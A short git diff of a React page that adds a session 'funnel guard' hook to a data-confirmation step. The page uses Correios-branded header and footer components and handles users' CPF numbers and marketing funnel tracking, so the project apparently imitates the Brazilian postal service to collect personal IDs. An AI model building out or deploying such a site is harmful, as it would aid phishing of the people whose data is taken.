@@ -4,13 +4,14 @@ import { Button } from "@/components/ui/button";
 import CorreiosHeader from "@/components/CorreiosHeader";
 import CorreiosFooter from "@/components/CorreiosFooter";
 import { CPFData } from "@/lib/cpf";
-import { saveSession, getSession, clearSession } from "@/hooks/useSessionPersistence";
+import { saveSession, getSession, clearSession, useFunnelGuard } from "@/hooks/useSessionPersistence";
 import { buildUrlWithUtm } from "@/hooks/useUtmTracking";
 import { trackFunnelEvent } from "@/hooks/useFunnelTracking";
 
 const ConfirmaDados = () => {
   const navigate = useNavigate();
   const location = useLocation();
+  useFunnelGuard("/confirma-dados");
   const cpfData: CPFData | undefined = location.state?.cpfData || getSession()?.cpfData;
   const cepData = location.state?.cepData;
 
